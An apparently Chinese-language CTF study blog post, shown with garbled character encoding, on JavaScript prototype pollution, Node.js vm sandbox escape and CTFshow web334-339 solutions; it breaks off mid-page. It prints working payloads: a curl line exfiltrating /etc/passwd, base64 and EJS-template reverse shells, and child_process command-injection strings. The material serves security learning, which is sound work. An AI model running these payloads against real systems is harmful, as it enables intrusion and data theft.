ä¸€ä¸ªshowå‡½æ•°ï¼ŒåŒæ ·æ˜¯åˆ©ç”¨ç»§æ‰¿æ¥å®ç°å­˜åœ¨foo.show()</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221173043928.png" alt="image-20220221173043928"></p><p>æ€»ç»“ä¸€ä¸‹</p><ol><li><code>prototype</code>æ˜¯ä¸€ä¸ªç±»çš„å±æ€§ï¼Œæ‰€æœ‰ç±»å¯¹è±¡åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å°†ä¼šæ‹¥æœ‰<code>prototype</code>ä¸­çš„å±æ€§å’Œæ–¹æ³•</li><li>ä¸€ä¸ªå¯¹è±¡çš„<code>__proto__</code>å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨çš„ç±»çš„<code>prototype</code>å±æ€§</li><li>ç±»åœ¨è¿è¡Œç¨‹åºè¿è¡Œæ—¶æ˜¯å¯ä»¥ä¿®æ”¹çš„</li></ol><h2 id="JavaScriptçš„åŸå‹ä¸åŸå‹é“¾"><a href="#JavaScriptçš„åŸå‹ä¸åŸå‹é“¾" class="headerlink" title="JavaScriptçš„åŸå‹ä¸åŸå‹é“¾"></a>JavaScriptçš„åŸå‹ä¸åŸå‹é“¾</h2><p>è¿™ç§ç»§æ‰¿æœºåˆ¶ä½¿å¾—JavaScriptä¸­æœ‰åŸå‹å’ŒåŸå‹é“¾çš„å­˜åœ¨</p><p><strong>åŸå‹</strong></p><p>â‘ æ‰€æœ‰<code>å¼•ç”¨ç±»å‹</code>éƒ½æœ‰ä¸€ä¸ª<code>__proto__(éšå¼åŸå‹)</code>å±æ€§ï¼Œå±æ€§å€¼æ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡<br>â‘¡æ‰€æœ‰<code>å‡½æ•°</code>éƒ½æœ‰ä¸€ä¸ª<code>prototype(åŸå‹)</code>å±æ€§ï¼Œå±æ€§å€¼æ˜¯ä¸€ä¸ªæ™®é€šçš„å¯¹è±¡<br>â‘¢æ‰€æœ‰<code>å¼•ç”¨ç±»å‹çš„__proto__</code>å±æ€§<code>æŒ‡å‘</code>å®ƒ<code>æ„é€ å‡½æ•°çš„prototype</code></p><p><strong>åŸå‹é“¾</strong></p><p>å½“è®¿é—®ä¸€ä¸ªå¯¹è±¡çš„æŸä¸ªå±æ€§æ—¶ï¼Œä¼šå…ˆåœ¨è¿™ä¸ªå¯¹è±¡æœ¬èº«å±æ€§ä¸ŠæŸ¥æ‰¾ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œåˆ™ä¼šå»å®ƒçš„__proto__éšå¼åŸå‹ä¸ŠæŸ¥æ‰¾ï¼Œå³å®ƒçš„æ„é€ å‡½æ•°çš„prototypeï¼Œå¦‚æœè¿˜æ²¡æœ‰æ‰¾åˆ°å°±ä¼šå†åœ¨æ„é€ å‡½æ•°çš„prototypeçš„__proto__ä¸­æŸ¥æ‰¾ï¼Œè¿™æ ·ä¸€å±‚ä¸€å±‚å‘ä¸ŠæŸ¥æ‰¾å°±ä¼šå½¢æˆä¸€ä¸ªé“¾å¼ç»“æ„ï¼Œæˆ‘ä»¬ç§°ä¸ºåŸå‹é“¾ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/787416-20160322110905589-2039017350.png" alt="ä»€ä¹ˆæ˜¯åŸå‹é“¾ï¼Ÿ"></p><p>ä¸¾ä¾‹ï¼š</p><p>è‹¥æœ‰ä»£ç </p><pre class="language-none"><code class="language-none">function Parent(month)&#123;    this.month &#x3D; month;&#125;var child &#x3D; new Parent(&#39;Ann&#39;);console.log(child.month); &#x2F;&#x2F; Annconsole.log(child.father); &#x2F;&#x2F; undefined</code></pre><p>åˆ™åœ¨childä¸­æŸ¥æ‰¾æŸä¸ªå±æ€§æ—¶ä¼š</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/20180620134143385" alt="è¿™é‡Œå†™å›¾ç‰‡æè¿°"></p><h2 id="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"><a href="#ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“"></a>ä»€ä¹ˆæ˜¯åŸå‹é“¾æ±¡æŸ“</h2><p>Object.prototypeæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œç”¨äºè¡¨ç¤ºObjectçš„åŸå‹å¯¹è±¡ã€‚å‡ ä¹æ‰€æœ‰çš„JavaScriptå¯¹è±¡éƒ½æ˜¯Objectçš„å®ä¾‹ï¼Œå…¶åŸå‹é“¾ä¸Šæœ€åä¸€ä¸ªå°±æ˜¯æŒ‡å‘Object.prototypeã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹Object.prototypeæ¥å®ç°å¯¹å˜é‡çš„ä¿®æ”¹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221182419388.png" alt="image-20220221182419388"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å°†a.<em>_proto</em>_.bar è®¾ç½®ä¸º2</p><p>æ–°å®šä¹‰çš„å˜é‡ä¹Ÿæœ‰äº†barå±æ€§ï¼Œä¸”ä¸º2</p><p>é‚£ä¹ˆï¼Œåœ¨ä¸€ä¸ªåº”ç”¨ä¸­ï¼Œå¦‚æœæ”»å‡»è€…æ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŸå‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯<strong>åŸå‹é“¾æ±¡æŸ“</strong>ã€‚</p><h2 id="åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨"><a href="#åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨" class="headerlink" title="åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨"></a>åŸå‹é“¾æ±¡æŸ“çš„åˆ©ç”¨</h2><p>å½“å­˜åœ¨æ§åˆ¶æ•°ç»„ï¼ˆå¯¹è±¡ï¼‰çš„â€œé”®åâ€çš„æ“ä½œæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¾ç½®__proto__çš„å€¼ï¼Œä»è€Œå®ç°åŸå‹é“¾æ±¡æŸ“</p><h3 id="æœ€æ˜¾ç„¶çš„æƒ…å†µ"><a href="#æœ€æ˜¾ç„¶çš„æƒ…å†µ" class="headerlink" title="æœ€æ˜¾ç„¶çš„æƒ…å†µ"></a>æœ€æ˜¾ç„¶çš„æƒ…å†µ</h3><pre class="language-none"><code class="language-none">obj[a][b] &#x3D; valueobj[a][b][c] &#x3D; value</code></pre><p>å¦‚æœæ§åˆ¶äº†a,b,cåŠvalueå°±å¯ä»¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“çš„æ”»å‡»,</p><p>å¯ä»¥æ§åˆ¶<code>a=__proto__</code>,,æˆ‘ä»¬å°±å¯ä»¥ç»™objectå¯¹è±¡çš„åŸå‹è®¾ç½®ä¸€ä¸ªbå±æ€§, å€¼ä¸ºvalue. è¿™æ ·æ‰€æœ‰ç»§æ‰¿objectå¯¹è±¡åŸå‹çš„å®ä¾‹å¯¹è±¡ä¼šåœ¨æœ¬èº«ä¸æ‹¥æœ‰bå±æ€§çš„æƒ…å†µä¸‹, éƒ½ä¼šæ‹¥æœ‰bå±æ€§, ä¸”å€¼ä¸ºvalue.</p><h3 id="åˆ©ç”¨ç‰¹æ®Šçš„api"><a href="#åˆ©ç”¨ç‰¹æ®Šçš„api" class="headerlink" title="åˆ©ç”¨ç‰¹æ®Šçš„api"></a>åˆ©ç”¨ç‰¹æ®Šçš„api</h3><ul><li>å¯¹è±¡merge</li><li>å¯¹è±¡cloneï¼ˆå…¶å®å†…æ ¸å°±æ˜¯å°†å¾…æ“ä½œçš„å¯¹è±¡mergeåˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li></ul><p>ä¾‹å¦‚</p><pre class="language-none"><code class="language-none">function merge(target, source) &#123;    for (let key in source) &#123;        if (key in source &amp;&amp; key in target) &#123;            merge(target[key], source[key])        &#125; else &#123;            target[key] &#x3D; source[key]        &#125;    &#125;&#125;</code></pre><p>è¿™æ—¶å¦‚æœkeyæ˜¯__proto__ä¸å°±å¯ä»¥ç›´æ¥ä¿®æ”¹å…¶åŸå‹äº†å—</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221200009010.png" alt="image-20220221200009010"></p><p>ä½†æ˜¯è¿™é‡Œå¹¶æ²¡æœ‰æˆåŠŸï¼Œè¿™æ˜¯å› ä¸ºï¼Œæˆ‘ä»¬ç”¨JavaScriptåˆ›å»ºo2çš„è¿‡ç¨‹ï¼ˆ<code>let o2 = &#123;a: 1, &quot;__proto__&quot;: &#123;b: 2&#125;&#125;</code>ï¼‰ä¸­ï¼Œ<code>__proto__</code>å·²ç»ä»£è¡¨o2çš„åŸå‹äº†ï¼Œæ­¤æ—¶éå†o2çš„æ‰€æœ‰é”®åï¼Œä½ æ‹¿åˆ°çš„æ˜¯<code>[a, b]</code>ï¼Œ<code>__proto__</code>å¹¶ä¸æ˜¯ä¸€ä¸ªkeyï¼Œè‡ªç„¶ä¹Ÿä¸ä¼šä¿®æ”¹Objectçš„åŸå‹ã€‚</p><p>åªæœ‰ç»è¿‡JSON.parseè§£æ,æ‰èƒ½è®©<code>__proto__</code>ä»£è¡¨äº†ä¸€ä¸ªkey</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221200323952.png" alt="image-20220221200323952"></p><p>æˆåŠŸæ±¡æŸ“</p><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">æ·±å…¥ç†è§£ JavaScript Prototype æ±¡æŸ“æ”»å‡» | ç¦»åˆ«æ­Œ (leavesongs.com)</a></p><p><a href="https://blog.csdn.net/xiaoermingn/article/details/80745117?ops_request_misc=%7B%22request_id%22:%22164543411816780274140815%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164543411816780274140815&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-80745117.pc_search_result_cache&utm_term=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1018.2226.3001.4187">ã€åŸå‹å’ŒåŸå‹é“¾ã€‘ä»€ä¹ˆæ˜¯åŸå‹å’ŒåŸå‹é“¾_æ²‰è¿·å­¦ä¹  æ—¥æ¸æ¶ˆç˜¦-CSDNåšå®¢_åŸå‹é“¾</a></p><p><a href="https://blog.csdn.net/weixin_45551083/article/details/109589386?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_title~default-1.pc_relevant_aa&spm=1001.2101.3001.4242.2&utm_relevant_index=3">åŸå‹é“¾æ±¡æŸ“æ¼æ´(ä¸€)_lonmarçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="https://www.jianshu.com/p/6e623e9debe3">ä»æ­ç”µhgame-week4å­¦åŸå‹é“¾æ±¡æŸ“ - ç®€ä¹¦ (jianshu.com)</a></p><p><a href="https://www.cnblogs.com/shuiyi/p/5305435.html">ä¸‰å¼ å›¾ææ‡‚JavaScriptçš„åŸå‹å¯¹è±¡ä¸åŸå‹é“¾ - æ°´ä¹™ - åšå®¢å›­ (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/a3320315/article/details/102883325">JavaScript Prototypeæ±¡æŸ“æ”»å‡»ï¼ˆCTF ä¾‹é¢˜åˆ†æï¼‰_a3320315çš„åšå®¢-CSDNåšå®¢</a></p><h1 id="node-js-æ²™ç›’é€ƒé€¸"><a href="#node-js-æ²™ç›’é€ƒé€¸" class="headerlink" title="node.js æ²™ç›’é€ƒé€¸"></a>node.js æ²™ç›’é€ƒé€¸</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>åœ¨nodejså½“ä¸­äº†ï¼Œevalå§‹ç»ˆå­˜åœ¨ç€ä¸€å®šçš„é—®é¢˜ï¼Œèƒ½å¤Ÿå‡ºä¹æ„æ–™çš„æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><pre class="language-none"><code class="language-none">å¯¹äºå­˜åœ¨åˆ©ç”¨å¯èƒ½æ€§çš„evalå‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨chile_process.execæ¥é—´æ¥è°ƒç”¨&#x2F;bash.shã€‚å®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨evalå‡½æ•°çš„å‚æ•°ä¸­å¯ä»¥æ„é€ require(&#39;child_process&#39;).exec(&#39;&#39;);æ¥è¿›è¡Œè°ƒç”¨ã€‚likeï¼šè¯»å–æ–‡ä»¶ï¼šrequire(&#39;child_process&#39;).exec(&#39;curl -F &quot;x&#x3D;&#96;cat &#x2F;etc&#x2F;passwd&#96;&quot; http:&#x2F;&#x2F;vps&#39;);;   åå¼¹shellï¼š  q&#x3D;require(&#39;child_process&#39;).exec(&#39;echo YmFzaCAtaSAmZ3Q7JiAvZGV2L3RjcC8xOTIuMTY4LjExNC4xLzQ0NDQgMCZndDsmMQ&#x3D;&#x3D;|base64 -d|bash&#39;);  å³bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.114.1&#x2F;4444 0&gt;&amp;1  </code></pre><p>ç±»evalå‡½æ•°ï¼š</p><pre class="language-scss" data-language="scss"><code class="language-scss">setInteval(some_function, 2000)setTimeout(some_function, 2000);ç›¸å½“äºåŒ¿åå‡½æ•°ï¼Œå³phpå½“ä¸­create_functionã€‚</code></pre><p>eval/Function ç®—æ˜¯åŠ¨æ€æ‰§è¡Œ JSï¼Œä½†æ— æ³•å±è”½å½“å‰æ‰§è¡Œç¯å¢ƒçš„ä¸Šä¸‹æ–‡ï¼Œä½† <a href="https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020">node</a>.js é‡Œæä¾›äº† vm æ¨¡å—ï¼Œç›¸å½“äºä¸€ä¸ªè™šæ‹Ÿæœºï¼Œå¯ä»¥è®©ä½ åœ¨æ‰§è¡Œä»£ç æ—¶å€™éš”ç¦»å½“å‰çš„æ‰§è¡Œç¯å¢ƒï¼Œé¿å…è¢«æ¶æ„ä»£ç æ”»å‡»ã€‚</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221225320251.png" alt="image-20220221225320251"></p><p>åœ¨è¿™æ®µä»£ç ä¸­ï¼Œæˆ‘ä»¬æ˜æ˜å®šä¹‰äº†y=2ä½†ä»ç„¶æ˜¾ç¤ºyä¸å­˜åœ¨ï¼Œè¿™æ­£æ˜¯vmçš„ä½œç”¨</p><p>vm.runInContext()æ–¹æ³•ç”¨äºç¼–è¯‘ä»£ç ã€‚å®ƒåœ¨contextifiedObjectçš„ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»£ç ï¼Œç„¶åè¿”å›è¾“å‡ºã€‚æ­¤å¤–ï¼Œæ­£åœ¨è¿è¡Œçš„ä»£ç æ— æ³•è®¿é—®æœ¬åœ°èŒƒå›´ï¼Œå¹¶ä¸”ä»¥å‰ä½¿ç”¨vm.createContext()æ–¹æ³•å°†contextifiedObjectå¯¹è±¡ä¸Šä¸‹æ–‡åŒ–ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å°†codeè¿™æ®µè¦ç¼–è¯‘å’Œè¿è¡Œçš„ä»£ç é™åˆ¶åœ¨äº†contextåŸŸä¸­ï¼Œæ— æ³•è®¿é—®åˆ°è¶…å‡ºä¸Šä¸‹æ–‡å¤–çš„ä»»ä½•ä¿¡æ¯</p><p>è¿™çœ‹èµ·æ¥æ˜¯ååˆ†å®‰å…¨çš„æ–¹å¼</p><p>ä½†åœ¨å®˜ç½‘ä¸­æœ‰è¿™æ ·ä¸€æ®µè¯<strong>vm æ¨¡å—ä¸æ˜¯å®‰å…¨çš„æœºåˆ¶ã€‚ ä¸è¦ä½¿ç”¨å®ƒæ¥è¿è¡Œä¸å—ä¿¡ä»»çš„ä»£ç ã€‚</strong></p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œvmæ¨¡å—åŒæ ·æœ‰è¢«é€ƒé€¸çš„é£é™©</p><h2 id="VMé€ƒé€¸"><a href="#VMé€ƒé€¸" class="headerlink" title="VMé€ƒé€¸"></a>VMé€ƒé€¸</h2><pre class="language-none"><code class="language-none">const vm &#x3D; require(&quot;vm&quot;);const ctx &#x3D; &#123;&#125;;vm.runInNewContext(&#39;this.constructor.constructor(&quot;return process&quot;)().exit()&#39;,ctx);console.log(&quot;Never gets executed.&quot;);</code></pre><p>è¿™æ®µä»£ç å°±æ˜¯åˆ©ç”¨äº†åŸå‹é“¾è¿›è¡Œvmé€ƒé€¸å¯¼è‡´äº†ç¨‹åºçš„æå‰é€€å‡º</p><p>åˆ›å»ºvmç¯å¢ƒæ—¶ï¼Œé¦–å…ˆè¦åˆå§‹åŒ–ä¸€ä¸ªå¯¹è±¡ ctxï¼Œè¿™ä¸ªå¯¹è±¡å°±æ˜¯vmä¸­è„šæœ¬æ‰§è¡Œæ—¶çš„å…¨å±€ç¯å¢ƒcontextï¼Œvm è„šæœ¬ä¸­å…¨å±€ this æŒ‡å‘çš„å°±æ˜¯è¿™ä¸ªå¯¹è±¡ã€‚ç„¶ååˆ©ç”¨constructoræ¥å¾—åˆ°Function</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221230610013.png" alt="image-20220221230610013"></p><p>å‡½æ•°æ„é€ å™¨å°±åƒjavascriptç»™å‡ºçš„æœ€é«˜å‡½æ•°ï¼Œå®ƒå¯ä»¥è®¿é—®å…¨å±€èŒƒå›´ï¼Œå› æ­¤å®ƒå¯ä»¥è¿”å›ä»»ä½•å…¨å±€çš„ä¸œè¥¿ã€‚ å‡½æ•°æ„é€ å™¨å…è®¸ä½ ä»ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ç”Ÿæˆä¸€ä¸ªå‡½æ•°ï¼Œä»è€Œæ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ä¸Šè¿°ä»£ç åœ¨æ‰§è¡Œæ—¶ï¼Œthis æŒ‡å‘ ctx å¹¶é€šè¿‡åŸå‹é“¾çš„æ–¹å¼æ‹¿åˆ°æ²™ç›’å¤–çš„ Funtionï¼Œvm è™šæ‹Ÿæœºç¯å¢ƒä¸­çš„ä»£ç é€ƒé€¸ï¼Œè·å¾—äº†ä¸»çº¿ç¨‹çš„ process å˜é‡ï¼Œå¹¶è°ƒç”¨ process.exit()ï¼Œé€ æˆä¸»ç¨‹åºéæ­£å¸¸é€€å‡ºã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬èƒ½å¤Ÿç”¨processå˜é‡æ¥åšæ›´å¤šçš„ä¸œè¥¿</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220221232104068.png" alt="image-20220221232104068"></p><p>æˆ–è€…è¿™æ ·</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222145853148.png" alt="image-20220222145853148"></p><p>å‚è€ƒæ–‡ç« </p><p><a href="https://blog.csdn.net/cosmoslin/article/details/122166825">ctfshowâ€”Node.jsæ¼æ´æ€»ç»“_cosmoslinçš„åšå®¢-CSDNåšå®¢</a></p><p><a href="http://www.javashuo.com/article/p-vwozjvrz-nu.html">node.js æ²™ç›’é€ƒé€¸åˆ†æ - JavaShuo</a></p><p><a href="https://www.cnblogs.com/ophxc/p/13663121.html">ä½ ç»ˆäºå›æ¥äº†(ã€‚ãƒ»âˆ€ãƒ»)ãƒ (cnblogs.com)</a></p><p><a href="https://xz.aliyun.com/t/7184#toc-10">Node.js å¸¸è§æ¼æ´å­¦ä¹ ä¸æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h1 id="CTFSHOW-nodejséƒ¨åˆ†"><a href="#CTFSHOW-nodejséƒ¨åˆ†" class="headerlink" title="CTFSHOW nodejséƒ¨åˆ†"></a>CTFSHOW nodejséƒ¨åˆ†</h1><h2 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154508492.png" alt="image-20220222154508492"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154516338.png" alt="image-20220222154516338"></p><p>ç”¨æˆ·åä¸ä¸ºCTFSHOW,è¿˜è¦ç»è¿‡å¤§å†™è½¬æ¢åç­‰äºCTFSHOW,æ‰€ä»¥ä¼ å…¥ctfshowå¯†ç ä¸º123456å°±è¡Œ</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222154618537.png" alt="image-20220222154618537"></p><h2 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h2><p>jsçš„å‘½ä»¤æ‰§è¡Œ</p><p>å¯ä»¥ä½¿ç”¨chile_process.execæ¥é—´æ¥è°ƒç”¨/bash.shã€‚<br>å®ƒæ˜¯ä¸€ä¸ªbashè§£é‡Šå™¨ï¼Œå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚åœ¨evalå‡½æ•°çš„å‚æ•°ä¸­å¯ä»¥æ„é€ require(&#39;child_process&#39;).exec(&#39;&#39;);æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>execå› ä¸ºè¿”å›å€¼çš„é—®é¢˜æ²¡æ³•åˆ©ç”¨</p><p>æ‰€ä»¥è¿™é‡Œå¯ä»¥ç”¨execSync</p><p>eval=require(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p><p>eval=require(&#39;child_process&#39;).execSync(&#39;cat fl00g.txt&#39;)</p><p>æˆ–è€…spawnSync</p><p>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</p><p>eval=require(&#39;child_process&#39;).spawnSync(&#39;cat&#39;,[&#39;fl00g.txt&#39;]).stdout.toString()</p><p>è¿˜å¯ä»¥ç”¨global.process.mainModule.constructor._loadæ›¿ä»£require</p><p>eval=global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;ls&#39;)</p><h2 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h2><p>è¿‡æ»¤äº†exec</p><p>ä½†æ˜¯å¯ä»¥ç”¨spawnSync</p><p>è¿˜å¯ä»¥åˆ©ç”¨fsæ¨¡å—æ–‡ä»¶æ“ä½œ</p><pre class="language-none"><code class="language-none">eval&#x3D;require(&#39;fs&#39;).readdirSync(&#39;.&#39;);eval&#x3D;require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;);</code></pre><h2 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h2><p>æ•°ç»„ç»•è¿‡ï¼Œä½†æ˜¯ä¸åŒäºphpçš„æ•°ç»„ç»•è¿‡</p><pre class="language-none"><code class="language-none">var express &#x3D; require(&#39;express&#39;);var router &#x3D; express.Router();var crypto &#x3D; require(&#39;crypto&#39;);function md5(s) &#123;  return crypto.createHash(&#39;md5&#39;)    .update(s)    .digest(&#39;hex&#39;);&#125;&#x2F;* GET home page. *&#x2F;router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;  res.type(&#39;html&#39;);  var flag&#x3D;&#39;xxxxxxx&#39;;  var a &#x3D; req.query.a;  var b &#x3D; req.query.b;  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;  res.end(flag);  &#125;else&#123;  res.render(&#39;index&#39;,&#123; msg: &#39;tql&#39;&#125;);  &#125;  &#125;);module.exports &#x3D; router;</code></pre><p>ä¼ å…¥aå’Œbä¸¤ä¸ªå‚æ•°ï¼Œé•¿åº¦ç›¸åŒä½†å¹¶ä¸ç›¸ç­‰ï¼ŒåŒæ—¶æ‹¼æ¥ä¸Šflagçš„md5å€¼ç›¸åŒ</p><p>jsæœ‰ä¸ªå¾ˆå¥‡æ€ªçš„ç‰¹æ€§</p><p>ä¸èƒ½ç›´æ¥æ¯”è¾ƒä¸¤ä¸ªæ•°ç»„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163045534.png" alt="image-20220222163045534"></p><p>è€Œä¸”æ‹¼æ¥å­—ç¬¦ä¸²æ—¶ä¹Ÿæœ‰ä¸ªç‰¹æ€§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163227744.png" alt="image-20220222163227744"></p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥a[]=1&amp;b[]=1å°±èƒ½å®Œç¾æ»¡è¶³ifåˆ¤æ–­å¾—åˆ°flag</p><p>è€Œå¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯éæ•°å­—ç´¢å¼•ï¼Œé‚£ä¹ˆä»–å°±ä¼šå˜æˆjsä¸­çš„å¯¹è±¡</p><p>å¯¹è±¡çš„æ‹¼æ¥åˆæœ‰è¿™ç§ç‰¹æ€§</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163556092.png" alt="image-20220222163556092"></p><p>æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥a[x]=1&amp;b[x]=2åŒæ ·å¯ä»¥æ»¡è¶³ifåˆ¤æ–­æ‹¿åˆ°flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222163644062.png" alt="image-20220222163644062"></p><h2 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h2><p>common.jsé‡Œæœ‰copyå‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164222078.png" alt="image-20220222164222078"></p><p>çŒœæµ‹æ˜¯åŸå‹é“¾æ±¡æŸ“</p><p>çœ‹login.js</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222164251260.png" alt="image-20220222164251260"></p><p>è®©secertçš„ctfshowå±æ€§ç­‰äº36dboy</p><p>{&quot;__proto__&quot;:{&quot;ctfshow&quot;:&quot;36dboy&quot;}}</p><p>æŠ“åŒ…ä¹‹åæ”¹ä¸€ä¸‹</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171254531.png" alt="image-20220222171254531"></p><h2 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h2><p><strong>éé¢„æœŸè§£ï¼š</strong>åˆ©ç”¨ejsæ¨¡æ¿rceæ¼æ´</p><p>ç¾½å¸ˆå‚…çš„payloadï¼š</p><pre class="language-none"><code class="language-none">&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_llama1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F;port 0&gt;&amp;1\&quot;&#39;);var _llama2&quot;&#125;&#125;</code></pre><p>åå¼¹ä¹‹å‰å¯ä»¥å…ˆå…³ä¸€ä¸‹æœåŠ¡å™¨çš„é˜²ç«å¢™systemctl stop firewalld</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225454461.png" alt="image-20220222225454461"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222225546970.png" alt="image-20220222225546970"></p><p><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/">å‡ ä¸ªnodeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“åˆ†æ | L0nm4r (lonmar.cn)</a></p><p><a href="https://blog.csdn.net/gental_z/article/details/107937110">CVE-2020-7699æ¼æ´åˆ†æ_gental_zçš„åšå®¢-CSDNåšå®¢</a></p><p><strong>é¢„æœŸè§£ï¼š</strong></p><p>ç™»å½•éƒ¨åˆ†</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222170708843.png" alt="image-20220222170708843"></p><p>åŒæ ·çš„copyå‡½æ•°</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222170726147.png" alt="image-20220222170726147"></p><p>è¿™é‡Œè¦æ±‚ctfshow=flagçš„å†…å®¹ï¼Œå¯æˆ‘ä»¬å¹¶ä¸çŸ¥é“flag</p><p>æˆ‘ä»¬å†çœ‹çœ‹api.js</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/js/image-20220222171015673.png" 